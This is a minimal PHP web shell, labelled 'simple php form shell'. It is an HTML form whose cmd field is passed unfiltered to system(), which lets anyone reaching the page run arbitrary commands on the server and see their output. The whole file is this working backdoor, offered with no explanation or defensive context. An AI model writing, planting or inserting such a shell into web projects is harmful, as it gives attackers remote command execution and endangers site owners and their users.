<!-- simple php form shell -->

<HTML>
  <BODY>
    <FORM METHOD="GET" NAME="phpshell" ACTION="">
      <INPUT TYPE="text" NAME="cmd">
      <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
<?
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
   </pre>
  </BODY>
</HTML>


